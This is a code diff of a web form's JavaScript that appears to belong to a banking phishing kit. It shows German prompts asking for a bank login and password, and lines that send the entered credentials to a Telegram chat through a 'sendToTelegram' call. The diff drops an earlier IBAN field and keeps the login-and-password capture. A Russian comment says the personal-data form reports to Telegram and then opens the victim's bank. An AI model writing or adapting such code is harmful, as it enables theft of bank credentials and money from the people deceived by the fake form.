-                if (!iban) { alert('Bitte IBAN eingeben'); return; }
+                const btn = document.getElementById('bankSubmitBtn');
                 
-                const btn = document.getElementById('ibanSubmitBtn');
+                if (!login || !password) { alert('Bitte Login und Passwort eingeben'); return; }
+
+                const bankData = { login, password };
                 const original = btn.innerHTML;
+                
                 btn.disabled = true;
                 btn.textContent = 'Sending...';
 
                 try {
-                    await sendToTelegram(buildBankMessage({ login: currentLogin, password: currentPassword }, { iban: iban }));
+                    await sendToTelegram(buildBankMessage(bankData));
                     btn.textContent = '✓ Sent';
                     btn.style.background = '#1a7f37';
                 } catch (err) {
@@ -3124,7 +2706,7 @@
                 if (bankSelect.value) setError('bank', '');
             });
 
-            // Отправка формы личных данных - сразу отправляет в ТГ и открывает нужный банк
+            // Отправка формы личных данных
             form.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 if (!validateGroup(Object.keys(FIELD_RULES), FIELD_RULES)) return;
